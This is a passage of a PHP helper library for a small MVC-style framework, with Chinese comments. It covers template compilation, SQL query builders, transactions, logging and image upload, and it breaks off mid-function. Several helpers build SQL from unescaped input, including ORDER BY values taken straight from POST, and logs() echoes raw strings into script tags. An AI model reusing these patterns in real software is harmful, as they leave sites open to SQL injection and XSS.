<?php
/*
 * 放一些常用的函数
 *
 * 方便直接调用
 *
 */
defined('INIT') or exit('Access Denied');


/*定位view文件
 * 区域，控制器，方法，布局文件
 * 生成之后进行引用
 */
function view($root, $layout,$other)
{
	global $_df;
// var_dump($root, $layout);
	$area=$_df['area'];
	$ctrl=$_df['ctrl'];
	$func=$_df['action'];

    //手机、pc分开调用模板
    //手机模板
    if (isMobile() && WAP_PAGE_ENABLE) {
        //处理控制器之外的文件
        if ($other) {
            $layout = $from = $root . "/view/public/{$layout}_m.htm";
            $back = $to = ROOT . "/cache/view/public/{$layout}_m.php";
            //wap页面不存在就调用pc页面
            $layout = $from = !is_file($layout) ? $root . "/view/public/{$layout}.htm" : $layout;
        } else {
            $back = ROOT . "/areas/{$area}/controller/{$ctrl}controller.php";
            $from_base = ROOT . "/areas/{$area}/view/{$ctrl}/{$func}_m.htm";
            $to = ROOT . "/cache/areas/{$area}/view/{$ctrl}/{$func}_m.php";
            $layout_base = $root . "/view/public/{$layout}_m.htm";
            //wap页面不存在就调用pc页面
            $from = !is_file($from_base) ? ROOT . "/areas/{$area}/view/{$ctrl}/{$func}.htm" : $from_base;
            $layout = !is_file($layout_base) ? $root . "/view/public/{$layout}.htm" : $layout_base;
            //	  	die($layout);
        }
    }
    //PC模板
    else {
        //处理控制器之外的文件
        if ($other) {
            $layout = $from = $root . "/view/public/{$layout}.htm";
            $back = $to = ROOT . "/cache/view/public/{$layout}.php";
        } else {
            //很奇怪无法获取php文件的修改时间，获取到的是空
            $back = ROOT . "/areas/{$area}/controller/{$ctrl}controller.php";
            $from = ROOT . "/areas/{$area}/view/{$ctrl}/{$func}.htm";
            $to = ROOT . "/cache/areas/{$area}/view/{$ctrl}/{$func}.php";
            $layout = $root . "/view/public/{$layout}.htm" ;
        }
    }

    //找不到该文件
    if (!is_file($from)) {
        exit("Error: view source '{$from}' is not exist!");
    }

    //如果前端文件不存在，或者前端文件修改时间小于html、布局页、后台页，或者处于测试状态
    if (!is_file($to) || filemtime($from) > filemtime($to) || filemtime($layout) > filemtime($to) || filemtime($back) > filemtime($to) || DEV) {
        //确认好文件路径之后，进行html的替换，生成php文件
        view_conversion($from, $to, $layout);
    }
				// var_dump($back,$from,$to,$layout);
    return $to;
}


function view_front($layout="common",$other=false){
	return	view(THEME_HOMEPAGE_ROOT,$layout,$other);
}

function view_back($layout="common",$other=false){
	return	view(THEME_ADMIN_ROOT,$layout,$other);
}


//将html转化为php
function view_conversion($from, $to, $layout)
{
    //获取文件目录
    $path = dirname($to);

    //创建目录
    mkdirs($path);

    $content = view_replace($from, $layout);
    //写入文件
    file_put_contents($to, $content);
}


/*
 * 创建目录
 *
 * 如果目录不存在就根据路径创建无限级目录
 *
 *
 */
function mkdirs($path)
{
    //检查指定的文件是否是目录
    if (!is_dir($path)) {
        mkdirs(dirname($path)); //循环创建上级目录
        mkdir($path);
    }
    return is_dir($path);
}

/*读取html文件内容，并进行关键字替换
 * 所有代码必须通过header、body、footer标签进行加载
 * view文件里的标签之外的字符会被忽略
 *
 * 原理是把share文件作为框架来加载view页面
 *
 * 标签为主，特殊字符为辅
 *
 *
 * 先将子页面的控件加载到主页面，然后替换关键语句
 * "df-code"必须放在控件里，不然不会运行
 *
 */
function view_replace($str, $layout)
{
    $str = file_get_contents($str);
    if (empty($layout)) {
        return $str;
    }
    $layout = @file_get_contents($layout);

    //	echo $str;
    //preg_match的第一个参数用单引号还是双引号，效果一样
    preg_match("/<df-html>([\s\S]*?)<\/df-html>/", $str, $html);
    preg_match("/<df-header>([\s\S]*?)<\/df-header>/", $str, $header);
    preg_match("/<df-body>([\s\S]*?)<\/df-body>/", $str, $body);
    preg_match("/<df-footer>([\s\S]*?)<\/df-footer>/", $str, $footer);


    //布局
    if (count($html) == 0) {
        $html=['',''];
    }

    if (count($header) == 0) {
        $header=['',''];
    }
    if (count($body) == 0) {
        $body=['',''];
    }
    if (count($footer) == 0) {
        $footer=['',''];
    }

    $layout = preg_replace('/<df-html([\s\S]*?)\/>/', $html[1], $layout);
    $layout = preg_replace('/<df-header([\s\S]*?)\/>/', $header[1], $layout);
    $layout = preg_replace('/<df-body([\s\S]*?)\/>/', $body[1], $layout);
    $layout = preg_replace('/<df-footer([\s\S]*?)\/>/', $footer[1], $layout);
    //	var_dump($layout);die();
    //遍历list,需要提前替换
    $layout = preg_replace('/<df-each ([\s\S]*?)>/', '<?php $num=0; if(isset($1))foreach($1 as $k=>$v){  $num++;        ?>', $layout);
    $layout = preg_replace('/<\/df-each>/', '<?php } ?>', $layout);
    $layout = preg_replace('/!`([\s\S]*?)`/', '<?php echo $v["$1"] ?>', $layout); //提取list的值
    $layout = preg_replace('/<df-val value=\"([\s\S]*?)\"([\s\S]*?)\/>/', '<?php echo $v["$1"] ?>', $layout); //提取list的值

    //遍历缓存数据
    $layout = preg_replace('/<df-each-cache ([\s\S]*?)>/', '<?php if(isset($1)) foreach($1->{"data"} as $key=>$val){   ?>', $layout);
    $layout = preg_replace('/<\/df-each-cache>/', '<?php } ?>', $layout);
    $layout = preg_replace('/#`([\s\S]*?)`/', '<?php echo $val->{"$1"} ?>', $layout);
    $layout = preg_replace('/<df-val-cache value=\"([\s\S]*?)\"\/>/', '<?php echo $val->{"$1"} ?>', $layout);



    //组装if语句
    $layout = preg_replace('/<df-if ([\s\S]*?)>/', '<?php if($1){ ?>', $layout);
    $layout = preg_replace('/<df-elif ([\s\S]*?)>/', '<?php } else if($1){ ?>', $layout);
    $layout = preg_replace('/<df-else>/', '<?php } else{ ?>', $layout);
    $layout = preg_replace('/<\/df-if>/', '<?php } ?>', $layout);

    $layout = preg_replace('/!{if ([\s\S]*?)}/', '<?php if($1){ ?>', $layout);
    $layout = preg_replace('/!{elif ([\s\S]*?)}/', '<?php } else if($1){ ?>', $layout);
    $layout = preg_replace('/!{else}/', '<?php } else{ ?>', $layout);
    $layout = preg_replace('/!{\/if}/', '<?php } ?>', $layout);



    //执行代码，单行或多行
    $layout = preg_replace('/!{([\s\S]*?)}!/', '<?php $1 ?>', $layout);
    $layout = preg_replace('/<df-code>([\s\S]*?)<\/df-code>/', '<?php $1 ?>', $layout);


    //打印字符串，只能匹配单行
    $layout = preg_replace('/<df-print value=\"([\s\S]*?)\"\/>/', '<?php echo $1 ?>', $layout);
    $layout = preg_replace('/!!([\s\S]*?)!!/', '<?php echo $1 ?>', $layout);


    //防止关键字被非法格式化而进行注释，最后恢复被注释的内容
    $layout = preg_replace('/\/\*d([\s\S]*?)d\*\//', '$1', $layout);


    $layout = '' . $layout;
    return $layout;
}

//调用model文件，并new一个对象
function m($name = '')
{
    if (stripos($name, '/') > -1) {
					// windows
        $model =is_file( ROOT . "modules/" . $name . '.php')? ROOT . "modules/" . $name . '.php': DF_PHP_ROOT . "modules/" . $name . '.php';
        if (!is_file($model)) {
            die(' Model ' . $model . ' Not Found!');
        }
        require $model;
        $name = explode('/', $name);
        $name = implode('\\', $name);
        $class_name = $name;
    } else {
					// linux
								$model =is_file( ROOT . "modules/" . strtolower($name) . '.php')? ROOT . "modules/" . strtolower($name) . '.php': DF_PHP_ROOT . "modules/" . strtolower($name) . '.php';
        if (!is_file($model)) {
            die(' Model ' . strtolower($name) . ' Not Found!');
        }
        require $model;
        //首字母变大写
        $class_name = ucfirst($name);
    }

    $m = new $class_name();
    return $m;
}

//调用某个plugin文件，并new一个对象
function p($dir, $name = '')
{
    $model = ROOT . "module/" . strtolower($dir) . '/' . strtolower($name) . '.php';
    if (!is_file($model)) {
        die(' Model ' . $name . ' Not Found!');
    }
    require $model;
    //首字母变大写
    $class_name = ucfirst($name);
    $m = new $class_name();
    return $m;
}

//网页跳转的提示页面
function message($msg, $redirect = '')
{
    //直接跳转
    if (empty($msg) && !empty($redirect)) {
        header('location: ' . $redirect);
    } else {
        //		var_dump($redirect);
        $redirect = SplitUrl($redirect);
        include view_back('message',true);
    }
    exit();
}

/*
 * 原生js弹窗。网页会终止运行
 *
 * ['error', 'warning', 'info', 'success', 'input', 'prompt']
 */
function show_message($title = 'df', $msg = '', $return_url = null, $type = 'warning')
{

    //擦除之前的所有显示数据
    ob_end_clean();
    if ($return_url == "reload") {
        $jump = "location.reload()";
    } elseif (empty($return_url)) {
        $jump = "";
    } else {
        $jump = sprintf('location.href="%s"', $return_url);
    }
    include view_back('message',true);
    die();
}



//输出json，然后终止当前请求
function show_json($status = 1, $return = array(), $msg = '')
{
    $ret = array(
        'status' => $status,
        'msg' => $msg
    );
    if ($return) {
        $ret['result'] = $return;
    }

    show_json_base($ret);
}

function show_json_base($return = array())
{
    //json格式
    header('content-type:application/json;charset=utf-8');
    //中文不加密
    die(json_encode($return, JSON_UNESCAPED_UNICODE));
}




//是微信端则返回true
function is_weixin()
{
    if (empty($_SERVER['HTTP_USER_AGENT']) || strpos($_SERVER['HTTP_USER_AGENT'], 'MicroMessenger') === false && strpos($_SERVER['HTTP_USER_AGENT'], 'Windows Phone') === false) {
        return false;
    }
    return true;
}







//http与https相互转换
function httpAndhttps()
{
    if ($_SERVER["HTTPS"] == "on") {
        $xredir = "http://" . $_SERVER["SERVER_NAME"] .
            $_SERVER["REQUEST_URI"];
        header("Location: " . $xredir);
    } else {
        $xredir = "https://" . $_SERVER["SERVER_NAME"] .
            $_SERVER["REQUEST_URI"];
        header("Location: " . $xredir);
    }
}



/*将时间戳转化为正常的时间格式
 *
 * eg:
 * getTime($output["time"],"Y/m/d H:i:s")
 *
 */
function getTime($time = '', $type = 0)
{
    if ($type == 0) {
        $str = 'Y-m-d H:i:s';
    } elseif ($type == 1) {
        $str = 'Y-m-d';
    } else {
        $str = 'Y.m.d';
    }
    if (!empty($time)) {
        return date($str, $time);
    } else {
        return date("Y-m-d H:i:s");
    }
}

/*将时间字符串转化为时间戳，格式化之后转化为正常的时间格式
 *
 * eg:
 * getTimeFromStr($output["time"],"Y/m/d H:i:s")
 *
 *
 */
function getTimeFromStr($time, $type = 0)
{
    if (is_numeric($type)) {
        if ($type == 0) {
            $str = 'Y-m-d H:i:s';
        } elseif ($type == 1) {
            $str = 'Y-m-d';
        }
    } else {
        $str = $type;
    }
    //date_default_timezone_set('Asia/Shanghai'); //设置为东八区上海时间
    return date($str, strtotime($time));
}

/*拼接url参数
 *
 * SplitUrl("A/c/a/para",array(zdy=>$zdy))
 * eg:
 * SplitUrl("wx/home/share_manage_show/{$v[0]}",array(wxId=>$_df['wxId']))
 *
 */
function SplitUrl($str, $get = null)
{
    //去掉字符串首尾空格
    $str = trim($str);
    $s = explode("/", $str);
    //单个路径就直接跳转
    if (count($s) == 1 || $str == '/') {
        return SITE . $s[0];
    }
    //去掉元素的首尾空格
    for ($i = 0; $i < count($s); $i++) {
        $s[$i] = trim($s[$i]);
    }

    if (count($s) < 4) { //防止数组添加新的项之后影响后续判断
        $s[3] = "";
    }
    if (count($s) < 3) { //设置默认值
        $s[2] = "index";
    }
    if (empty($s[2])) {
        $s[2] = "index";
    }

    $s[4] = '';
    if (is_array($get)) { //增加多参数
        foreach ($get as $key => $val) {
            $s[4] .= sprintf('&%s=%s', $key, $val);
        }
    }

    //$rt=SITE."index.php?A={$s[0]}&c={$s[1]}&a={$s[2]}&para={$s[3]}{$s[4]}";
    $rt = SITE . "{$s[0]}/{$s[1]}/{$s[2]}/{$s[3]}{$s[4]}";
    return $rt;
}






//-----------------------------------------------------database--------------------start


/*
 * 简洁执行sql语句
 *
 *
 */
function sql($sql)
{
    global $db;
    $sql = trim($sql);
    //echo $sql;
    //查询
    $o = strtolower(substr($sql, 0, 4));
    if ($o == "sele" || $o == 'show') {
        $r = $db->query($sql);
        if ($r->num_rows > 0) {
            $rt = $r->fetch_all(MYSQLI_BOTH);
        } //返回编号和字段名
        else {
            $rt = array();
        }
    }
    //执行
    else {
        $db->query($sql);
        //返回新插入的数据id
        if ($o == "inse") {
            $rt = $db->insert_id;
        } else {
            //受影响行数
            $rt = $db->affected_rows;
        }
        $rt = $rt ? $rt : false;
    }

    //容错处理
    if (!empty($db->error)) {
        $err = sprintf("语句：%s\r\n错误信息：%s", $sql, json_encode($db->error));
        //echo $err;
        logs($err, 'sql err');
        //die();
        $rt = false;
    }
    return $rt;
}

/*
 * 运行sql
 *
 * 有容错处理
 */
function query($sql)
{
    global $db;
    debug($sql);
    $r = $db->query($sql);
    //容错处理
    if (!empty($db->error)) {
        echo($db->error);
        $err = sprintf("语句：%s\r\n错误信息：%s", $sql, json_encode($db->error));
        logs($err, 'sql错误');
        //die();
    }
    return $r;
}


/*
 * 查询字符串格式化
 *
 *
 * 多列
 * query_format('df',['type'=>1,'parentId'=>2],['time','desc'],[0,1]); *
 * query_format('df',['type'=>1],['time','desc'],10);
 * query_format('df',['type'=>1],['time','desc']);
 * query_format('df',['type'=>1]);
 *
 *
 * 单列
 * 默认para为id
 * query_format('df',1);
 * query_format('df',['type'=>1]);
 *
 */
function query_format($tb, $para = array(), $order = array(), $limit = array())
{
    if (empty($tb)) {
        return array();
    }

    //拼接where
    if (empty($para)) {
        $where = '';
    } elseif (is_numeric($para)) {
        $where = 'where Id=' . $para;
    } elseif (is_string($para)) {
        $where = 'where ' . $para;
    } elseif (is_array($para)) {
        $where = 'where 1=1';
        if (!empty($para)) {
            foreach ($para as $key => $value) {
                if ($value === null) {
                    $where .= sprintf(" and `%s` is null", $key);
                } else {
                    $where .= sprintf(" and `%s`='%s'", $key, $value);
                }
            }
        }
    }


    //拼接order
    if (empty($order)) {
        $order = '';
    } elseif (is_string($order)) {
        $order = 'order by Id ' . $order;
    } elseif (is_array($order)) {
        if (count($order) == 2) {
            $order = sprintf('order by %s %s', $order[0], $order[1]);
        } else {
            $order = sprintf('order by %s %s', array_key_first($order), $order[array_key_first($order)]);
        }
    }


    //拼接limit
    if (empty($limit)) {
        $limit = '';
    } else {
        if (is_array($limit)) {
            $limit = sprintf('limit %s,%s', $limit[0], $limit[1]);
        } elseif (is_numeric($limit)) {
            $limit = sprintf('limit %s', $limit);
        }
    }



    //带条件获取整个表的数据
    $sqlString = sprintf("select * from `%s` %s %s %s", $tb, $where, $order, $limit); //sql语句的表名区分大小写

    // var_dump([$sqlString,$tb, $where,$order, $limit]);

    return $sqlString;
}


/*
 * 根据字段类型获取默认值
 *
 *
 */
function getTypeValue($tb, $column)
{
    $sql = sprintf("SELECT
 NUMERIC_SCALE,COLUMN_NAME,DATA_TYPE
FROM
    information_schema. COLUMNS
WHERE TABLE_NAME = '%s' and COLUMN_NAME='%s';
", $tb, $column);
    $dt = show($sql);
    $value = $dt[0][0];
    return $value;
}

/*
 * 格式化更新语句
 *
 * 新增
 * query_format_other('df',['title'=>1]);
 *
 *
 * 更新
 * query_format_other('df',['title'=>1],['type'=>1]); *
 * 默认para为id
 * query_format_other('df',['title'=>1],3);
 *
 */
function query_format_update_insert($tb, $data = array(), $para = array())
{
    global $db;
    if (empty($tb) || empty($data)) {
        return array();
    }

    //新增
    if (empty($para)) {
        $data_str=$data_str_key =$data_str_val= '';
        if (!empty($data)) {
            foreach ($data as $key => $value) {
                if (empty($value)) {
                    $value = getTypeValue($tb, $key);
                } elseif (is_int($value)) {
                    $value = intval($value);
                } else {
                    $value = mysqli_escape_string($db, $value);
                }
                $data_str_key .= sprintf("`%s`,", $key);
                $data_str_val .= sprintf("'%s',", $value);
            }
        }
        //去掉尾部逗号
        $data_str_key = substr($data_str_key, 0, -1);
        $data_str_val = substr($data_str_val, 0, -1);
        $data_str = sprintf('(%s) values(%s)', $data_str_key, $data_str_val);



        $sqlString = sprintf("insert into `%s` %s", $tb, $data_str); //sql语句的表名区分大小写
    }
    //编辑
    else {
        $data_str = 'set';
        if (!empty($data)) {
            foreach ($data as $key => $value) {
                if (empty($value)) {
                    $value = getTypeValue($tb, $key);
                } elseif (is_int($value)) {
                    $value = intval($value);
                } else {
                    $value = mysqli_escape_string($db, $value);
                }
                $data_str .= sprintf(" `%s`='%s',", $key, $value);
            }
        }
        //去掉尾部逗号
        $data_str = substr($data_str, 0, -1);


        //拼接where
        if (is_numeric($para)) {
            $where = 'where Id=' . $para;
        } elseif (is_string($para)) {
            $where = 'where ' . $para;
        } else {
            $where = 'where 1=1';
            if (!empty($para)) {
                foreach ($para as $key => $value) {
                    $where .= sprintf(" and `%s`='%s'", $key, $value);
                }
            }
        }


        $sqlString = sprintf("update `%s` %s %s", $tb, $data_str, $where); //sql语句的表名区分大小写
    }
    //var_dump($sqlString);die();
    return $sqlString;
}


/*
 * 删除数据
 *
 * query_format_del('df',['type'=>3])
 *
 * 根据Id删除
 * query_format_del('df',5)
 *
 * 清空表
 * query_format_del('df')
 *
 *
 *
 */
function query_format_del($tb, $para = array())
{
    global $db;
    if (empty($tb)) {
        return array();
    }

    //拼接where
    if (is_numeric($para)) {
        $where = 'where Id=' . $para;
    } elseif (is_string($para)) {
        $where = 'where ' . $para;
    } else {
        $where = 'where 1=1';
        if (!empty($para)) {
            foreach ($para as $key => $value) {
                $where .= sprintf(" and `%s`='%s'", $key, $value);
            }
        }
    }

    $sqlString = sprintf("delete from `%s` %s", $tb, $where); //sql语句的表名区分大小写

    return $sqlString;
}


/*
 * 执行sql语句
 * 返回数组
 *
 *
 */
function show($sql)
{
    $r = query($sql);
    //始终返回数组
    $rt = $r->fetch_all(MYSQLI_BOTH);
    $rt = empty($rt) ? array() : $rt;
    return $rt;
}


/*
 *
 * 输出表格数据
 *
 * 返回数组
 */
function show_list($tb, $para = array(), $order = array(), $limit = array())
{
    $sql = query_format($tb, $para, $order, $limit);
    $rt = show($sql);
    return $rt;
}





/*
 * 读取首条数据
 *
 *
 */
function show_first($tb, $para = array(), $order = array(), $limit = array())
{
    $sql = query_format($tb, $para, $order, $limit);
    $r = query($sql);
    $rt = $r->fetch_array(MYSQLI_BOTH);
    return $rt;
}


/*
 *
 * 多行则返回数组
 * 单行则返回键值对
 *
 */
function show_auto($tb, $para = array(), $order = array(), $limit = array())
{
    $sql = query_format($tb, $para, $order, $limit);

    $r = query($sql);


    //多条
    if ($r->num_rows > 1) {
        $rt = $r->fetch_all(MYSQLI_BOTH);
    }
    //单条
    else {
        //读取首条数据
        $rt = $r->fetch_array(MYSQLI_BOTH);
    }

    $rt = empty($rt) ? array() : $rt;
    return $rt;
}



/*
 * 变量
 *
 *Enum::reloadParent
 */
class Enum
{
    const goBack = 1;
    const reloadParent = 2;
    const reloadCurrent = 3;
}


/*
 *
 *
 * 编辑
 * $rt=update('df',['key'=>'xxx'],['Id'=>3])
 * $rt=update('df',['key'=>'xxx'],3)
 *
 * update('df',['key'=>'xxx'],3,"homepage/column/".$db_hc)
 * update('df',['key'=>'xxx'],3,Enum.goBack)
 *
 */
function update($tb, $data = array(), $para = array(), $rt = null)
{
    $sql = query_format_update_insert($tb, $data, $para);
    $return = 0;
    //新增
    if (empty($para) || (isset($para["Id"]) && $para["Id"] == 0) || (isset($para["id"]) && $para["id"] == 0) || (isset($para["ID"]) && $para["ID"] == 0)) {
        $return = insert($tb, $data, $rt);
    }
    //编辑
    else {
        //开启事务。防止高并发
        query("START TRANSACTION");
        $r = query($sql);
        //提交事务
        query("COMMIT");
        if ($r) {
            $return = 1;
        }
    }

    if ($return > 0) {
        //什么都不执行
        if ($rt == null) {
            return $return;
        }
        //返回之前的页面
        elseif ($rt == 1) {
            echo "<script>history.go(-2)</script>";
        }
        //刷新父页面
        elseif ($rt == 2) {
            echo "<script>parent.location.reload()</script>";
        }
        //刷新当前页面
        elseif ($rt == 3) {
            echo "<script>location.reload()</script>";
        }
        //执行js代码
        elseif ($js = strstr($rt, "js:")) {
            echo "<script>{$js}</script>";
        //调用后台跳转页面
        } else {
            message('操作成功', $rt);
        }
    } else {
        return $return;
    }
}

/*
 * 新增
 *
 * 获取新行id
 * $id=insert('df',['key'=>'xxx'])
 *
 * 跳转
 * insert('df',['key'=>'xxx'],Enum.goBack)
 *
 *
 */
function insert($tb, $data = array(), $rt = null)
{
    $sql = query_format_update_insert($tb, $data);
    //开启事务。防止高并发
    query("START TRANSACTION");
    $r = query($sql);
    //提交事务
    query("COMMIT");
    $return = 0;
    if ($r) {
        $return = show('SELECT LAST_INSERT_ID()');
        $return = $return[0][0]; //返回新增的id
    }
    if ($return > 0) {
        //什么都不执行
        if ($rt == null) {
            return $return;
        }
        //返回之前的页面
        elseif ($rt == 1) {
            echo "<script>history.go(-2)</script>";
        }
        //刷新父页面
        elseif ($rt == 2) {
            echo "<script>parent.location.reload()</script>";
        }
        //刷新当前页面
        elseif ($rt == 3) {
            echo "<script>location.reload()</script>";
        }
        //执行js代码
        elseif ($js = strstr($rt, "js:")) {
            echo "<script>{$js}</script>";
        //调用后台跳转页面
        } else {
            message('操作成功', $rt);
        }
    } else {
        return $return;
    }
}




/*
 * 删除数据
 *
 * 根据条件删除
 * del('df',['type'=>3])
 *
 * 默认根据Id删除
 * del('df',5)
 *
 * 清空表
 * del('df')
 *
 * 跳转
 * del('df',['key'=>'xxx'],Enum.goBack)
 *
 */
function del($tb, $para = array(), $rt = null)
{
    global $db;
    $return = 0;

    $sql = query_format_del($tb, $para);
    $r = query($sql);

    if ($r) {
        $return = 1;
    }

    if ($return > 0) {
        //什么都不执行
        if ($rt == null) {
            return $return;
        }
        //返回之前的页面
        elseif ($rt == 1) {
            echo "<script>history.go(-2)</script>";
        }
        //刷新父页面
        elseif ($rt == 2) {
            echo "<script>parent.location.reload()</script>";
        }
        //刷新当前页面
        elseif ($rt == 3) {
            echo "<script>location.reload()</script>";
        }
        //执行js代码
        elseif ($js = strstr($rt, "js:")) {
            echo "<script>{$js}</script>";
        //调用后台跳转页面
        } else {
            message('操作成功', $rt);
        }
    } else {
        return $return;
    }
}

//执行sql语句
function exe($sql)
{
    global $db;
    $return = 0;
    $r = query($sql);
    if ($r) {
        $return = 1;
    }
    return $return;
}




/*
 * dataTable依赖
 *
 * 分页处理
 *
 *
 * show_page($db_Statistics,[],"Df_web_mng/data/".$db_Statistics);
 *
 */
function show_page($tb, $para = array(), $url = '')
{

    //var_dump($_POST);
    if ($_POST) {
        $start = $_POST['start'];
        $length = $_POST['length'];

        $search = $_POST['search']['value'];
        $order_column = $_POST['order'][0]['column'];
        $order_column = $_POST['columns'][$order_column]['data'];
        $order_type = $_POST['order'][0]['dir'];
        $order = [$order_column, $order_type];
        //var_dump($order_column,$_POST['order'][0]['column'],$_POST['columns']);

        $total_count = show(sprintf("select count(*) from %s", $tb))[0][0];
        $data = show_list($tb, $para, $order, [$start, $length]);
        $data_rt = array();
        if (!empty($url)) {
            foreach ($data as $key => $value) {
                $url_view = SplitUrl(sprintf("%sview/%s", $url, $value[0]));
                $url_edit = SplitUrl(sprintf("%sadd/%s", $url, $value[0]));
                $url_del = SplitUrl(sprintf("%sdel/%s", $url, $value[0]));
                $opt = <<<EOT
<a href='{$url_view}'>[预览]</a>
<a href='{$url_edit}'>[编辑]</a>
<a href='{$url_del}' onclick='return confirm("您确认要删除吗？")'>[删除]</a>
EOT;

                $value['opt'] = $opt;
                $data_rt[] = $value;
            }
        }

        $return = array(
            'draw' => $_POST['draw'],
            'recordsTotal' => $total_count,
            'recordsFiltered' => $total_count,
            'data' => $data_rt,
            'error' => ''
        );

        show_json_base($return);
    }
}





/*
 *第一个参数为空就调用第二个参数
 */
function set_val($default, $other)
{
    $rt = empty($default) ? $other : $default;
    return $rt;
}
/*
 *将表中的所有字段初始化为空字符串
 *数据不存在的时候用来填充数据
 *
 */
function table_init($table)
{
    global $database;
    //获取表字段名、类型、备注
    $r = show(sprintf("select column_name,data_type,column_comment from information_schema.COLUMNS where table_name = '%s' and table_schema = '%s'", $table, $database));
    //unset($r[0]);

    $item = [];
    //var_dump($r);
    foreach ($r as $v) {
        $name = $v[0];
        $type = $v[1];
        if ($type == "int") {
            $item[$name] = 0;
        } else {
            $item[$name] = "";
        }
    }
    return $item;
}




/*
 * 连接sql服务器，执行sql语句
 * 单刀插入数据（无视一切规则，强行添加）
 * 支持远程连接
 *
 */
function add($tb, $data)
{
    $server = "localhost";
    $acc = "mysql account";
    $pwd = "mysql password";
    $database = "database name";
    @$db = new MySQLi($server, $acc, $pwd, $database); //阻止显示错误
    $sql1 = '';
    $sql2 = '';
    foreach ($data as $key => $val) {
        $sql1 = $sql1 . $key . ',';
        $sql2 = $sql2 . "'" . $val . "',";
    }
    $sql1 = substr($sql1, 0, strlen($sql1) - 1);
    $sql2 = substr($sql2, 0, strlen($sql2) - 1);
    $sql = "insert into `{$tb}`({$sql1}) values({$sql2})";
    logs($sql, 2);
    //echo $tb.$sql1.$sql2.$sql;
    $r = query($sql);
    return $r;
}



/*开始事务
 *
 *停用自动提交
 *检测表是否支持事务
 */
function begin($table = array())
{
    global $db;
    //关闭自动提交
    $db->autocommit(false);
    if (!empty($table)) {
        $table = is_array($table) ? $table : array($table);
        foreach ($table as $v) {
            $Engine = query("show table status like '$v'");
            $Engine = strtolower($Engine[0]['Engine']);
            if ($Engine != 'innodb') {
                die("$table表类型必须是InnoDB");
            }
        }
    }
}

/*结束事务
 *
 * 提交数据
 *
 */
function commit()
{
    global $db;
    $db->commit();
    //恢复自动提交
    $db->autocommit(true);
}

//回滚
function back()
{
    global $db;
    $db->rollback();
}

//关闭连接
function close()
{
    global $db;
    $db->close();
}

/*
 *根据sql的返回值调用事务
 *
 *执行sql失败就回滚
 */
function affair($v)
{
    if (!$v) {
        back();
        show_json('202', '账户收款失败');
    }
}
//----------------------database-----------------------end






/*
 * 用来输出记录
 * $override：是否覆盖（默认不覆盖）
 * $putConsole：是否输出信息到控制台（默认不输出）
 *
 * 必须单独调用sql，因为这是底层函数，很多高级函数依赖于此函数
 *
 */
function logs($str, $override = false, $putConsole = false)
{
    global $db;
    $dt['str'] = is_array($str) ? json_encode($str) : $str;
    $dt['time'] = getTime(TIMESTAMP);
    //var_dump($dt);die();
    if ($override) {
        $r0 = $db->query("delete from logs;");
        $r = $db->query(sprintf('insert into logs(str,time) values("%s","%s");', $dt['str'], $dt['time']));
    } else {
        $r = $db->query(sprintf('insert into logs(str,time) values("%s","%s");', $dt['str'], $dt['time']));
    }
    //打印到浏览器控制台
    if ($putConsole) {
        echo "<script>console.log('数据：')</script>";
        echo "<script>console.log('{$str}')</script>";
        echo "<script>alert('{$str}')</script>";
    }
}



//用来创建文件
function writeFile($str, $file = "df.php")
{
    $myfile = fopen(getenv('DOCUMENT_ROOT') . "/{$file}", "w") or die("Unable to open file!");
    fwrite($myfile, $str);
    fclose($myfile);
}



/*
 * 上传文件
 * 配合上传组件使用
 * js上传组件会接收所有的echo
 * 默认不改尺寸，不使用富文本框的上传组件
 * 建议每个视图都单独使用一个控制器下的方法来调用这个函数
 *
 * 支持图片、音乐
 * 目前不支持icon
 *
 *
 * 可以拓展出任何文件的上传
 *
 *
 * 可以用来覆盖特定文件
 * upload_file($name,"120*120",0,'/assets/img/ewm1.jpg');
 *
 *
 * upload_file($name,0,2);  //layui编辑器上传
 *
 * 返回文件的上传路径
 *
 *
 * $name：控件的name参数
 */
function upload_file($name, $size = 0, $editTool = 0, $Path = '')
{
    global $m;
    //区分不同的数据类型
    switch ($name) {
        case 'vtour':
            break;
        case 'upfile':
            break;
        default:
            break;
    }

    //设置文件上传的最大尺寸
    $imgSize = 104857600; //100M    1024*1024*100
    $mp3Size = 104857600;
    $zipSize = 104857600;
    //die(json_encode($_FILES));

    if ($_FILES == null) {
        die("not file");
    }

    $filename = $_FILES[$name]["name"];
    $filetype = $_FILES[$name]["type"];
    $filesize = $_FILES[$name]["size"] / 1024;
    $filetmpname = $_FILES[$name]["tmp_name"];
    $fileErr = $_FILES[$name]["error"];
    //图片上传
    if (
        ($filetype == "image/gif") #对应input——name=“file”     #判断文件类型和大小
        || ($filetype == "image/jpeg")
        || ($filetype == "image/pjpeg")
        || ($filetype == "image/png")
        //|| ($filetype == "image/vnd.microsoft.icon")
    ) {
        //	die();
        //以byte为单位
        if ($filesize > $imgSize) {
            echo "-3";
        } //超出尺寸
        else {
            if ($fileErr > 0) { #判断是否出错
                echo "-1"; //文件出错
            } else {
                $path = "upload/pics/" . $name . '/';
                mkdirs($path);
                //自动生成路径
                if (empty($Path)) {
                    $newname = $path . $name . "_" . date("YmdHis") . "." . $m->get_ext($filename);
                } //新文件名
                //固定路径
                else {
                    $newname = $Path;
                } //新文件名


                if ($size) {
                    $size = $m->Split($size, "*");
                    $m->resizejpg($filetmpname, $newname, $size[0], $size[1]); #将临时文件转变尺寸之后移动到网站目录
                } else {
                    move_uploaded_file($filetmpname, $newname);
                } #将临时文件移动到网站目录

                $ys = true; //开启图片压缩
                if ($ys) {
                    $percent = 1; #原图压缩，不缩放，但体积大大降低
                    $imgcompress = new imgcompress($newname, $percent);
                    $image = $imgcompress->compressImg($newname);
                }


                $newname = '/' . $newname;
                //header("Content-type: image/jpeg");
                //js上传插件会接收所有的echo数据
                //um单个文件上传
																if ($editTool == 0) {
																    echo delSpace($newname);
																} //js上传插件会接收所有的echo数据
																//um编辑框
																elseif ($editTool == 1) {
																    echo "{'url':'{$newname}','state':'SUCCESS',name:'',originalName:'',size:'',type:''}";
																}
																//layui编辑器上传
																elseif ($editTool == 2) {
																    $json = array(code => 0, msg => 'error', 'data' => array('src' => $newname, 'title' => $newname));
																    echo(json_encode($json));
																}
																//editormd编辑器上传
																else if($editTool==3){
																	$json=["success"=>1,"url"=>$newname,"state"=>'SUCCESS',"name"=>"","originalName"=>'',"size"=>'',"type"=>''];
																	echo(json_encode($json));
																}
																else
																	echo $newname;
            }
        }
    }

    //其他文件
    else {
        //音乐上传
        if (
            ($filetype == "audio/mp3")
            || ($m->get_ext($filename) == "mp3")
        ) {
            $path = "upload/music/";
            $fileSizeMax = $mp3Size;
        }
        //zip文件上传
        elseif (
